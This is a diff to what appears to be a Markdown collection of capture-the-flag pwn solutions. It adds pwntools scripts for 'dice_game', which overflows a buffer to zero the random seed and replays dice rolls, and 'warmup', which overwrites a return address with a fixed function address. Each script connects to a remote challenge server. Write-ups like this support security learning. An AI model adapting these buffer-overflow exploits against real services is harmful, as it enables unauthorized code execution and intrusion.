@@ -175,7 +175,36 @@ p.recvuntil('passwd:')
 p.sendline(pay)
 p.interactive()
 ```
+# dice_game
+```python
+from pwn import *
+
+#p=process('./dice_game')
+p=remote('111.198.29.45',51051)
+s='2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'
+s=s.split(' ')
+pay='a'*(0x50-0x10)+p64(0)
+
+p.sendlineafter('name:',pay)
+for i in range(50):
+    p.sendlineafter('(1~6): ',s[i])
+p.interactive()
+```
+# warmup
+```python
+from pwn import *
+p=remote('111.198.29.45',34624)
+#p=process('./warmup')
+
+addr=0x40060d
+#pay=flat(['a'*0x40,'a'*8,addr])
+pay='a'*(0x40+8)+p64(addr)
+
+p.sendline(pay)
+p.interactive()
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE1OTc3NTA4MTcsODE5NTQyMTk5LDE4Nj
-A5MzI1MTIsMTQzMTc1NjM5NCw2MDU0NjcxMV19
+eyJoaXN0b3J5IjpbMTIwMjAzNDg1LC0xNTk3NzUwODE3LDgxOT
+U0MjE5OSwxODYwOTMyNTEyLDE0MzE3NTYzOTQsNjA1NDY3MTFd
+fQ==
 -->
